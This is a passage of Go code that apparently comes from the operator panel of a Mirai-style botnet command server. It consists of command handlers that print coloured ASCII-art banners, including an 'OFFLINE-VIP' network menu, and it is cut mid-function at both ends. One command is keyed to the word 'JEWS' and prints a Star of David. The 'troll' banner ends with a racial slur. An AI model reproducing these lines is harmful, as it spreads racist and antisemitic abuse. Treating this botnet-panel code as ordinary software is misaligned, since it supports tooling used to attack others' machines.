this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣀⡤⢶⠆⠩⠁⠡⠭⠃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠐⠎⠂⢃⢆⢤⢀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣀⠄⠖⠈⠁⠄⠉⢼⣌⡁⠁⠄⠲⠠⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢀⡠⢶⠄⠄⠠⠆⠁⢡⠉⣀⣐⢄⢀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⠄⠄⠄⢠⢐⢔⠁⡅⠙⠂⠒⠒⠛⠓⠄⠉⠁⠄⢀⠄⡠⣨⣁⣂⠄⠄⠄⠄⠄⠄⠄⣀⠄⠄⠔⠐⢀⠘⣿⠗⠃⠏⠌⠁⠄⠄⠐⠉⠛⠊⠋⠘⠂⠐⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⠄⠄⠄⠄⢰⡂⠄⡇⠄⠄⡠⢄⠄⣤⡀⠄⠄⢠⠬⠄⡁⠘⠂⠚⠙⠂⠄⠄⢤⢰⡆⠁⡌⣴⠄⠐⠒⠛⡤⠠⢸⢠⠁⠄⠄⠄⠄⣄⢀⠄⠄⠄⠄⢒⢒⢂⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⠄⠄⠄⠄⢁⢞⡀⠃⠄⠄⠑⠎⠆⠠⡂⢄⠨⣑⢍⠚⡢⠄⠄⠄⠄⠚⠛⠋⠰⢼⡇⣧⡧⠋⠄⠄⠄⠄⢋⠃⢘⢜⠄⡤⡄⡀⢔⡈⣐⢠⠄⠄⠄⡌⠞⠈⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠘⠄⠁⠄⠄⠄⠆⠙⠺⡁⠉⠐⡑⠊⠴⠑⠑⠄⠄⠄⠄⠄⠄⠠⠄⣸⣇⢸⣇⣀⠄⠄⠄⠄⠘⠎⠠⢑⠰⢬⣍⡂⠄⢚⡂⠄⢟⠄⣀⡤⠡⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠑⡨⠢⡀⠄⢔⡂⠁⠡⠲⠄⠂⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢿⣧⢋⠁⠄⠄⠄⠄⠄⠄⢀⠊⠄⠗⠓⠤⠂⢰⣁⠢⠎⠈⠄⠚⣁⠋⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
      continue
        }
if err != nil || cmd == "hinata" || cmd == "HINATA" {
this.conn.Write([]byte("\033[2J\033[1H"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⢀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⡄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠁⠄⠄⠄⠄⢸⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⡆⠄⠄⠄⠄⢸⡄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣾⣿⣦\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⡆⡄⢀⣀⣇⣀⣀⣀⣀⣸⣇⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣯⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣄⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢀⣶⣴⣶⣶⡶⢬⣩⣿⣿⣿⣿⣿⣿⣩⣶⣾⣿⣶⣶⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣾⣿⠿⢋⣩⣭⡩⣿⣿⣿⣿⣿⣻⣿⠗⣂⣚⡻⠿⣿⡆⠄⠄⠄⠄⠄⠄⠄⠄⠄⢹⣿⠛⠋\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⡇⠄⠄⠄⠄⣦⣄⠄⠄⠄⠄⣜⡂⠄⠄⣿⣧⣼⣼⣿⣿⣷⣾⣿⣿⣿⣿⣿⣷⣟⣿⣿⢷⣤⣾⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣇⢠⣠\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣇⠄⠄⠄⠄⣿⣥⣄⠄⠄⠄⣾⡇⠄⠄⣿⣿⣿⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⠏⣿⣹\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⠄⠄⠄⠄⣿⣿⣿⣧⠄⠄⠘⣅⠄⠄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠄⠄⠂⠄⠄⠄⠄⠄⠄⠄⢠⣾⣿⣽\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⡿⠄⠄⠄⠄⣻⣿⣿⣿⡀⠄⠄⠈⠄⠄⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢷⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣿⡿⢿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⡇⠄⠄⠄⠄⣿⣿⣿⣿⡇⠄⠄⠄⠄⠄⠈⢿⣿⣿⣿⣿⣿⣿⡿⠿⣿⡿⠿⣿⣿⣿⣿⣿⡟⠈⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣿⣧⣤⣍\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⡇⠄⠄⠄⠄⢿⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠈⡻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⡇⠄⠄⠄⠄⣿⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⣀⣭⡀⣯⡿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⣀⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢠⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⠇⠄⠄⠄⠄⡟⠉⠙⠹⠁⠄⠄⠄⠄⠄⣆⣿⠈⠁⢹⣿⣿⣯⣿⣻⡿⣿⣯⣿⣿⠘⠹⢿⡆⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢀⣠⡴⡞⣳⣿⣿⡀⠄⠈⠙⠛⠿⠿⣿⣿⣿⡿⠟⠛⠄⠄⣸⣷⣆⣤⣄⣀⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠟⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⡷⣿⣿⣿⣿⣇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢀⣿⣿⣿⣿⣿⣿⣷⡄⠄⠄⠄⠄⢸⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⠄⠄⠄⢀⣴⣾⣿⣿⣿⣝⡻⣿⣿⣿⣷⣆⣦⣄⣂⠄⠄⠄⠄⠄⣀⣠⡄⣼⣿⣿⣿⢯⣿⣿⣿⣧⠄⠄⠄⠄⠈⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⠄⠄⣰⣿⣿⣿⣿⣿⣿⣿⣿⣮⣹⢿⣿⣿⣞⣿⡏⡄⠻⣘⠇⣿⣿⣿⣸⣿⣿⡿⢏⣿⣿⣿⣿⣿⣷⡀⠄⠄⠄⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⠄⢸⣿⣛⣿⣿⣻⣿⣿⣿⣿⣿⣿⣷⣝⣻⣿⡞⠓⠒⠒⠒⠚⠛⠛⢳⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠄⠄⠄⠄⠄⠙⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣯⣟⣿⣿⣿⣿⣿⣝⢿⣮⣿⣿⣿⣿⣿⣫⣾⣿⣷⣿⣿⣿⣿⢿⣿⣽⣷⣿⣿⣶⡄⠄⠄⠄⠚⢻\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⢠⣿⣿⣿⣿⣿⣿⡽⣿⣿⣿⣿⣿⣷⣿⣻⢿⣿⣿⣿⣽⣷⣝⣿⡿⣷⡿⢿⣿⣿⣿⣿⣯⣷⣿⣿⣿⣿⣿⣿⣿⣷⡄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⢸⣿⣽⣿⣿⣿⣿⣿⣻⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣟⡎⡿⠿⠯⢽⠿⡇⡏⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣻⣿⣿⣱⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⢸⣿⣿⣿⣿⣿⣿⣿⣏⣿⢸⡿⣹⣿⣿⣿⣿⣿⣿⣿⠆⣿⣿⡇⡿⣿⣷⠄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⡇⣿⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠸⣿⡯⣿⣿⣿⣿⣿⣿⢻⢸⣳⣿⣿⣿⣿⣿⣿⣿⣿⠄⣿⣿⣇⣃⣿⣿⡄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣿⣿⡇⣿⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⢻⡇⣿⣿⣿⣿⣿⣿⣾⢨⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⣿⣿⣿⡇⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣏⢿⣸⣿⣿⣧⢿⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⡸⣳⣿⣿⣿⣿⣿⣿⣏⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⢰⣿⣿⣿⢡⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⣿⣿⣤⣿⣿⣿⣿⣼⡀⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⣰⣹⣿⣿⣿⣿⢹⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣾⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⡇⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠠⢟⣿⣿⣿⣿⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡇⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⢸⣿⣿⣿⣿⣿⣿⡿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⢸⣿⣿⣿⢿⣿⣿⣿⠹⢟⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⣾⣿⣿⣿⣿⣿⣿⣷⣹⣿⡇⣿⣿⣿⣿⣿⣿⣿⡿⡇⣽⣶⣿⣿⣿⢸⣿⢻⣾⣇⠚⣟⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m        GO IN FULL SCREEN TO FULLY VIEW      \033[0m \r\n"))               
			   continue
        }
				if err != nil || cmd == "JEWS" || cmd == "jews" {
        	this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\x1b[0m               ▄▀▄               \r\n"))
			this.conn.Write([]byte("\x1b[0m             ▄▀░░░▀▄             \r\n"))
            this.conn.Write([]byte("\x1b[0m           ▄▀░░░░▄▀█             \r\n"))
            this.conn.Write([]byte("\x1b[0m         ▄▀░░░░▄▀ ▄▀ ▄▀▄         \r\n"))
            this.conn.Write([]byte("\x1b[0m       ▄▀░░░░▄▀ ▄▀ ▄▀░░░▀▄       \r\n"))
            this.conn.Write([]byte("\x1b[0m       █▀▄░░░░▀█ ▄▀░░░░░░░▀▄     \r\n"))
			this.conn.Write([]byte("\x1b[0m   ▄▀▄ ▀▄ ▀▄░░░░▀░░░░▄█▄░░░░▀▄   \r\n"))
            this.conn.Write([]byte("\x1b[0m ▄▀░░░▀▄ ▀▄ ▀▄░░░░░▄▀ █ ▀▄░░░░▀▄ \r\n"))
            this.conn.Write([]byte("\x1b[0m █▀▄░░░░▀▄ █▀░░░░░░░▀█ ▀▄ ▀▄░▄▀█ \r\n"))
            this.conn.Write([]byte("\x1b[0m ▀▄ ▀▄░░░░▀░░░░▄█▄░░░░▀▄ ▀▄ █ ▄▀ \r\n"))
			this.conn.Write([]byte("\x1b[0m   ▀▄ ▀▄░░░░░▄▀ █ ▀▄░░░░▀▄ ▀█▀   \r\n"))
            this.conn.Write([]byte("\x1b[0m     ▀▄ ▀▄░▄▀ ▄▀ █▀░░░░▄▀█       \r\n"))
            this.conn.Write([]byte("\x1b[0m      ▀▄ █ ▄▀ ▄▀░░░░▄▀ ▄▀        \r\n"))
            this.conn.Write([]byte("\x1b[0m        ▀█▀ ▄▀░░░░▄▀ ▄▀          \r\n"))
            this.conn.Write([]byte("\x1b[0m            █▀▄░▄▀ ▄▀            \r\n"))
			this.conn.Write([]byte("\x1b[0m             ▀▄ █ ▄▀             \r\n"))
			this.conn.Write([]byte("\x1b[0m               ▀█▀               \r\n"))
            this.conn.Write([]byte("\x1b[0m                                 \r\n"))
            continue
        }
        if err != nil || cmd == "mickey" || cmd == "MICKEY" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\033[1;90m                                                                                                                                                    \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                                              \033[90m.::`:`:`:.                                                      \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                                             \033[90m:.:.:.:.:.::.                                                    \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                                             \033[90m::.:.:.:.:.:.:                                                   \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                                             \033[90m`.:.:.:.:.:.:'                                                   \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                                        ,,\033[90m.::::.:.:.:.:.:'                                                    \r\n"))
            this.conn.Write([]byte("\033[1;90m                                             \033[97m.,,.                   \033[38;5;216m.,<?3$;e$$$$e\033[90m:.:.```                                    \r\n"))
            this.conn.Write([]byte("\033[1;90m                                           \033[97m,d$$$P            \033[90m.::. \033[38;5;216m,JP?$$$$$$,?$$$>\033[90m:.:`:    .,:,.                      \r\n"))
            this.conn.Write([]byte("\033[1;90m                                \033[97m_..,,,,.. ,?$$$>            \033[90m:.:*:.\033[38;5;216mF;$>$P?T$$$,$$$>\033[90m.:.:.:.::.:.:.::                    \r\n"))
            this.conn.Write([]byte("\033[1;90m____________________          \033[97m,<<<????9F$$$$$$$$>            \033[90m`:.:.\033[38;5;216m;  \033[90m)\033[38;5;216mdF<$>3$$$$$F\033[90m.:.:.:.::.:.:.:.::\r\n"))
            this.conn.Write([]byte("\033[1;90m                            \033[97mue<d<d<ed'dP????$$$$,             \033[38;5;216mu;e$bcRF  \033[90m)\033[38;5;216mJ$$$$$'\033[90m.:.:.:.::.:.:.:.:.:       \r\n"))
            this.conn.Write([]byte("\033[1;90m       \033[1;34mミッキー           \033[97m'<e<e<e<d'd$$$$$$$$$$$b            \033[38;5;216m$$$$$$$$oe$$$$$F\033[90m:.:.:.:.::.:.:.:.:.:'                       \r\n"))
            this.conn.Write([]byte("\033[1;90m____________________        \033[97m`??$$$???4$$$$$$$$$$F\033[90m::::..        \033[38;5;216m?$$$$$$$$$$$$$$$$$$b\033[90m.:.:: `.:.:.:.:'                   \r\n"))
            this.conn.Write([]byte("\033[1;90m                                       \033[97m``'????$$b;\033[90m:::::::d$$$$$c`\033[38;5;216m?$$$$$$$$F u($$$$$>\033[90m.:'    `'''`                 \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                   \033[90m`':::J$$$$$$$$bo\033[38;5;216m`\";_,\033[38;5;216meed$$$$$$P                                    \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                       \033[90m?$$$$$$$F$Fi,\033[38;5;216m''``'????''                                                   \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                       \033[90m`?$$?$$'d>???b`'e$$$$'$$$c                                                             \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                         \033[90m`'` .$$$$$$c.ee'?$'d$$$$$o.                                                          \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                            \033[90m.$$$$$$$$$$$$L,$$$$$$$$$bu                                                        \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                           \033[90m.$$$$$$$$$$$$$$$$'?$$$$$P\033[90m::.                                                 \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                           \033[90md$$$$$$$$$$$$$$`'  ?$$F\033[90m::::::.                                               \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                          \033[90m.$$$$$$$$$$$$`\033[97mod$bee.\033[90m`` .::::::                                         \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                           \033[90m$$$$$$$$$$$ \033[97mPLo$$$\033[90m:::::::::''                                          \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                           \033[90m'$$$$$$$$$>\033[97m<`uJF$$;\033[90m::''''                                              \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                          \033[1;34m`e``?$$$$PF,\033[97m`$bJJ$$br                                                         \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                           \033[1;34m$$$$eeee$$$o.\033[97m`????`                                                          \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                           \033[1;34m`$$$$E?$P$$$$$$$k                                                                  \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                            \033[1;34m'$$$$bi`?$$$$$$P                                                                  \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                             \033[1;34m`?$$$$$$ec,`??`                                                                  \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                               \033[1;34m'$$$$$$$$$$$$:...                                                              \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                                 \033[1;34m'?$$$$$$$$P:::$b,.                                                           \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                                    \033[1;34m'?R$$$P;::z$$;$b.                                                         \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                       \033[93m.zd$$$$bo;'?bJ>;;:u.'?$??;d$$$.                                                        \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                     \033[93m.d$$$$$$$$$$$$d$$P?''.uooo,>?$$$                                                         \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                     \033[93m4$$$$$$$$$$$$$$`,e$$$$$$$$$$$$$P                                                         \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                      \033[93m`?R$$$$$$$$$$`d$$$$$$$$$$$$$$P                                                          \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                           \033[93m`'''''`  `R$$$$$$$$$$$P'                                                           \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                                      \033[93m`'??????``                                                              \r\n"))
            continue
        }
        if err != nil || cmd == "owari" || cmd == "OWARI" {
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[0;96m                  \033[00;37m▒\033[\033[01;30m█████   █     █\033[00;37m░ \033[01;30m▄▄▄       \033[\033[01;30m██▀███   ██▓\r\n"))
            this.conn.Write([]byte("\033[0;96m                 \033[00;37m▒\033[\033[01;30m██\033[00;37m▒  \033[\033[01;30m██\033[00;37m▒\033[\033[01;30m▓█\033[00;37m░ \033[\033[01;30m█ \033[00;37m░\033[\033[01;30m█\033[00;37m░▒\033[\033[01;30m████▄    ▓██ \033[00;37m▒ \033[\033[01;30m██\033[00;37m▒\033[\033[01;30m▓██\033[00;37m▒\r\n"))
            this.conn.Write([]byte("\033[0;96m                 \033[00;37m▒\033[\033[01;30m██\033[00;37m░  \033[\033[01;30m██\033[00;37m▒▒\033[\033[01;30m█\033[00;37m░ \033[\033[01;30m█ \033[00;37m░\033[\033[01;30m█ \033[00;37m▒\033[\033[01;30m██  ▀█▄  ▓██ \033[00;37m░\033[\033[01;30m▄█ \033[00;37m▒▒\033[\033[01;30m██\033[00;37m▒\r\n"))
            this.conn.Write([]byte("\033[0;96m                 \033[00;37m\033[00;37m▒\033[\033[01;30m██   ██\033[00;37m░░\033[\033[01;30m█\033[00;37m░ \033[\033[01;30m█ \033[00;37m░\033[\033[01;30m█ \033[00;37m░\033[\033[01;30m██▄▄▄▄██ \033[00;37m▒\033[\033[01;30m██▀▀█▄  \033[00;37m░\033[\033[01;30m██\033[00;37m░\r\n"))
            this.conn.Write([]byte("\033[0;96m                 \033[00;37m░ \033[01;30m████▓\033[00;37m▒░░░\033[01;30m██\033[00;37m▒\033[01;30m██▓  ▓█   ▓██\033[00;37m▒░\033[01;30m██▓\033[00;37m ▒\033[01;30m██\033[00;37m▒░\033[01;30m██\033[00;37m░\r\n"))
            this.conn.Write([]byte("\033[0;96m                 \033[00;37m░ ▒░▒░▒░ ░ \033[01;30m▓\033[00;37m░▒ ▒   ▒▒   \033[01;30m▓\033[00;37m▒\033[01;30m█\033[00;37m░░ ▒\033[01;30m▓\033[00;37m ░▒\033[01;30m▓\033[00;37m░░\033[01;30m▓  \r\n"))
            this.conn.Write([]byte("\033[0;96m                 \033[00;37m  ░ ▒ ▒░   ▒ ░ ░    ▒   ▒▒ ░  ░▒ ░ ▒░ ▒ ░\r\n"))
            this.conn.Write([]byte("\033[0;97m                 \033[00;37m░ ░ ░ ▒    ░   ░    ░   ▒     ░░   ░  ▒ ░\r\n"))
            this.conn.Write([]byte("\033[0;97m                 \033[00;37m    ░ ░      ░          ░  ░   ░      ░  \r\n"))
            continue
        }
		   /*--------------------------------------------------------------------------------------------------------------------------------------------*/         		
					if err != nil || cmd == "offline" || cmd == "OFFLINE" || cmd == "off" || cmd == "OFF" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                        ╔════════════════\033[1;49;35m══════════════╗  \r\n"))
            this.conn.Write([]byte("\033[37m                        ║      ┌┐ ┌─┐┌┬┐┌\033[1;49;35m┬┐┌─┐┌┐┌      ║  \r\n"))
            this.conn.Write([]byte("\033[37m                        ║      ├┴┐├─┤ │ │\033[1;49;35m││├─┤│││      ║  \r\n"))
            this.conn.Write([]byte("\033[37m                        ║      └─┘┴ ┴ ┴ ┴\033[1;49;35m ┴┴ ┴┘└┘      ║  \r\n"))
            this.conn.Write([]byte("\033[37m                ╔═══════╚════════════════\033[1;49;35m══════════════╝════════╗    \r\n"))
            this.conn.Write([]byte("\033[37m                ║              BATMAN WIN\033[1;49;35mS  Project Kronus      ║    \r\n"))
            this.conn.Write([]byte("\033[37m                ╚════════════════════════\033[1;49;35m═══════════════════════╝    \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\033[1;49;35m                  ╔══════════════════════\033[37m════════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[1;49;35m                  ║ OFFLINE-VIP - offline\033[37m network - vip          ║\r\n"))
            this.conn.Write([]byte("\033[1;49;35m                  ║ OFFLINE-NORMAL - offl\033[37mine network - normal    ║\r\n"))
            this.conn.Write([]byte("\033[1;49;35m                  ╚══════════════════════\033[37m════════════════════════╝\r\n"))
            continue
        }//BANNERS
           /*--------------------------------------------------------------------------------------------------------------------------------------------*/
                if err != nil || cmd == "troll" || cmd == "TROLL" {
    this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte(fmt.Sprintf("\033[37m  \033[1;49;35mWELL.. LOOKS LIKE \033[37m" + username + "!\033[1;49;35m GOT TROLLED!!!        \r\n")))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\033[37m   ░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄░░░░░░░   \r\n"))
            this.conn.Write([]byte("\033[37m   ░░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄░░░░  \r\n"))
            this.conn.Write([]byte("\033[37m   ░░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█░░░  \r\n"))
            this.conn.Write([]byte("\033[37m   ░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█░░  \r\n"))
            this.conn.Write([]byte("\033[37m   ░▄▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░░█░  \r\n"))
            this.conn.Write([]byte("\033[37m   █░▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒░█  \r\n"))
            this.conn.Write([]byte("\033[37m   █░▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█  \r\n"))
            this.conn.Write([]byte("\033[37m   ░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█░  \r\n"))
            this.conn.Write([]byte("\033[37m   ░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█░░  \r\n"))
            this.conn.Write([]byte("\033[37m   ░░░█░░░░██░░▀█▄▄▄█▄▄█▄████░█░░░  \r\n"))
            this.conn.Write([]byte("\033[37m   ░░░░█░░░░▀▀▄░█░░░█░█▀██████░█░░  \r\n"))
            this.conn.Write([]byte("\033[37m   ░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█░░  \r\n"))
            this.conn.Write([]byte("\033[37m   ░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░▒░░░█░  \r\n"))
            this.conn.Write([]byte("\033[37m   ░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░░░░█░  \r\n"))
            this.conn.Write([]byte("\033[37m   ░░░░░░░░░░░░░░▀▄▄▄▄▄░░░░░░░░█░░  \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\033[1;49;35m       YEET NIGGA WRECKED \r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
    continue
        }
        /*--------------------------------------------------------------------------------------------------------------------------------------------*/

		if err != nil || cmd == "MILK" || cmd == "milk" {
